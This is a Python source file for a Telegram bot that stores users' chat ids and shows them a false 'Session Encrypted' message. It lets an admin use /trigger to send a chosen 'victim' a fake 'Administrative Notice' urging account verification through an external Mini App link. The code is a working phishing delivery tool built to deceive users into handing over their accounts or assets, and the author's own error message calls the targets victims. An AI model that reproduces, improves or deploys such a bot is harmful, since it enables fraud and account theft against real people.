import os
import http.server
import socketserver
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# --- CONFIG ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8699819680
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"

user_db = {}

# --- PORT BINDING FOR RENDER ---
def start_fake_server():
    with socketserver.TCPServer(("", 10000), http.server.SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()
threading.Thread(target=start_fake_server, daemon=True).start()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username.lower() if user.username else str(user.id)
    user_db[username] = update.effective_chat.id
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 Admin Active. Use `/trigger username`")
    else:
        await update.message.reply_text("🛡️ System: Session Encrypted.")

async def trigger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/trigger bnbwebina`")
        return

    target = context.args.lower().replace("@", "")
    
    if target in user_db:
        chat_id = user_db[target]
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Verify Channel", web_app=WebAppInfo(url=TMA_URL))]])
        
        try:
            await context.bot.send_message(
                chat_id=chat_id, 
                text="⚠️ **Administrative Notice**\nPlease verify your account authenticity.",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            # This line confirms it worked on YOUR screen
            await update.message.reply_text(f"🚀 SUCCESS: Audit sent to {target}")
        except Exception as e:
            await update.message.reply_text(f"❌ ERROR: {e}")
    else:
        await update.message.reply_text(f"❌ '{target}' not found. Try `/start` on victim first.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("trigger", trigger))
    # drop_pending_updates=True ensures no old commands interfere
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
